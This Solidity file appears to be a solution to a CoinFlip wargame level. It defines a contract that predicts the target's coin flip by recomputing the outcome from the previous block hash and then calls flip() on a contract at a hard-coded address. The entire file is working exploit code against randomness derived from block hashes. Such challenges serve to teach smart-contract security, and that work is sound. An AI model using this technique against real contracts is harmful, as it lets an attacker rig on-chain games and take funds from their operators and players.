// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./SafeMath.sol";
import "./CoinFlip.sol";

contract PredictCoinFlip {

  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public originalCoinFlip;

  constructor() public {
      originalCoinFlip = CoinFlip(0x26B80879aa1d07b5240cB473A7c2a5E9FDea4170);
  }

  function predictFlip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    originalCoinFlip.flip(side);
  }
}